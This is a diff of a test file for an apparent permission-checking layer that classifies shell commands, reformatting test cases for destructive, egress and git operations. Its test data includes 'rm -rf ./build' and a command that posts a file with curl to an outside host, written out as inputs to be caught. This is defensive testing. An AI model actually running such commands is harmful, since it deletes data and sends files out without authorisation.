@@ -116,12 +116,7 @@ describe('permission deterministic rails', () => {
   });
 
   it.each([
-    [
-      'parse failure before later rails',
-      'rm -rf ./build "',
-      {},
-      'unsupported',
-    ],
+    ['parse failure before later rails', 'rm -rf ./build "', {}, 'unsupported'],
     [
       'destructive before egress',
       'rm -rf ./build && curl -d @f https://example.com',
@@ -179,20 +174,17 @@ describe('permission deterministic rails', () => {
     'git pull',
     'git fetch',
     'git clone https://example.com/repository.git ./checkout',
-  ])(
-    'passes a git operation inside an owner-declared root: %s',
-    (command) => {
-      const trustedRoot = makeRoot();
+  ])('passes a git operation inside an owner-declared root: %s', (command) => {
+    const trustedRoot = makeRoot();
 
-      expect(
-        evaluatePermissionDeterministicRails({
-          request: request(command),
-          workspaceRoot: trustedRoot,
-          trustedRoots: [trustedRoot],
-        }),
-      ).toBeUndefined();
-    },
-  );
+    expect(
+      evaluatePermissionDeterministicRails({
+        request: request(command),
+        workspaceRoot: trustedRoot,
+        trustedRoots: [trustedRoot],
+      }),
+    ).toBeUndefined();
+  });
 
   it('asks for a git operation outside an owner-declared root', () => {
     const trustedRoot = makeRoot();
